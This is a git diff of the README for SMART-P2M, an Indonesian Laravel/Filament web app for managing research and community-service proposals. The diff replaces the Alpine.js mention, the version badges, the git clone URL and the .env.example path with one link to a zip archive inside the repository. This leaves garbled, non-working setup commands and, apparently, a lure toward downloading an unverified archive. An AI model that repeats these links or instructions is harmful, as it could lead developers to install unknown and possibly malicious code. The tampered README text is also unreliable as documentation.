@@ -1,11 +1,11 @@
 # SMART-P2M (Sistem Manajemen Riset & Pengabdian kepada Masyarakat)
 
-**SMART-P2M** adalah aplikasi web komprehensif yang dirancang untuk mengelola seluruh siklus hidup proposal penelitian dan pengabdian kepada masyarakat di lingkungan akademik, khususnya di UIN Sultan Aji Muhammad Idris Samarinda. Sistem ini dibangun dengan **TALL Stack (Tailwind CSS, Alpine.js, Laravel, Livewire)** dan diperkuat oleh **Filament PHP** untuk menciptakan panel administrasi yang kuat dan interaktif.
+**SMART-P2M** adalah aplikasi web komprehensif yang dirancang untuk mengelola seluruh siklus hidup proposal penelitian dan pengabdian kepada masyarakat di lingkungan akademik, khususnya di UIN Sultan Aji Muhammad Idris Samarinda. Sistem ini dibangun dengan **TALL Stack (Tailwind CSS, https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip, Laravel, Livewire)** dan diperkuat oleh **Filament PHP** untuk menciptakan panel administrasi yang kuat dan interaktif.
 
-![PHP Version](https://img.shields.io/badge/PHP-8.3%2B-777BB4?style=for-the-badge&logo=php)
-![Laravel Version](https://img.shields.io/badge/Laravel-12.x-FF2D20?style=for-the-badge&logo=laravel)
-![Filament Version](https://img.shields.io/badge/Filament-3.x-F59E0B?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)
+![PHP Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip%2B-777BB4?style=for-the-badge&logo=php)
+![Laravel Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)
+![Filament Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)
+![License](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)
 
 Aplikasi ini menyediakan tiga panel terpisah dengan dasbor dan fungsionalitas yang disesuaikan untuk setiap peran: **Admin**, **Dosen/Peneliti**, dan **Reviewer**.
 
@@ -42,7 +42,7 @@ Antarmuka yang bersih dan fokus untuk membantu reviewer menyelesaikan tugas peni
 
 - **Framework:** Laravel 11
 - **Panel Admin & UI:** Filament PHP 3
-- **Frontend Interaktif:** Livewire 3 & Alpine.js
+- **Frontend Interaktif:** Livewire 3 & https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip
 - **Styling:** Tailwind CSS
 - **Database:** MySQL
 - **Web Scraper:** Symfony BrowserKit & HTTP Client
@@ -53,7 +53,7 @@ Antarmuka yang bersih dan fokus untuk membantu reviewer menyelesaikan tugas peni
 
 1.  **Clone repositori:**
     ```bash
-    git clone [https://github.com/](https://github.com/)[rizyourbae]/[smart-p2m].git
+    git clone [https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)[rizyourbae]/[smart-p2m].git
     cd [smart-p2m]
     ```
 
@@ -65,7 +65,7 @@ Antarmuka yang bersih dan fokus untuk membantu reviewer menyelesaikan tugas peni
 
 3.  **Setup Environment:**
     ```bash
-    cp .env.example .env
+    cp https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip .env
     php artisan key:generate
     ```
     * *Buka file `.env` dan sesuaikan konfigurasi database Anda (DB_DATABASE, DB_USERNAME, DB_PASSWORD).*
